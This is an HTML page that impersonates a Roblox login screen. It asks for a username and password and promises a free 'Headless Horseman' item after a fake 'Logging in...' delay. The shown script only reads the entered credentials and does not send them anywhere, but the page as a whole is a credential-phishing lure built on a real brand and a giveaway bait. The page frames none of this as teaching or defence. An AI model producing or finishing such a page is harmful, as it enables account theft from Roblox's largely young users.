<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox Login</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-box, .success-box, .loading-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 320px;
            text-align: center;
        }

        h2 {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0074bd;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005fa3;
        }

        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0074bd;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

@keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .headless-img {
            width: 100px;
            margin: 20px 0;
        }

        .roblox-header {
            background: #e3e3e3;
            padding: 12px;
            text-align: center;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="roblox-header">
        Roblox
    </div>

    <div class="container">
        <div class="login-box" id="loginBox">
            <h2>Log in to Roblox</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button onclick="handleLogin()">Log In</button>
        </div>

        <div class="loading-box" id="loadingBox" style="display:none;">
            <h2>Logging in...</h2>
            <div class="loading-spinner"></div>
        </div>

        <div class="success-box" id="successBox" style="display:none;">
            <h2>Congratulations!</h2>
            <img src="https://tr.rbxcdn.com/b8df5f4d038b7c37c873dc33c43a1f1d/420/420/AvatarHeadshot/Png" alt="Headless Horseman" class="headless-img">
            <p>
                You just received the <strong>Headless Horseman</strong> item!
            </p>
        </div>
    </div>

    <script>
        function handleLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                document.getElementById('loginBox').style.display = 'none';
                document.getElementById('loadingBox').style.display = 'block';

                setTimeout(() => {
                    document.getElementById('loadingBox').style.display = 'none';
                    document.getElementById('successBox').style.display = 'block';
                }, 2000); // simulate delay
            } else {
                alert("Please fill in both fields.");
            }
        }
    </script>
</body>
</html>
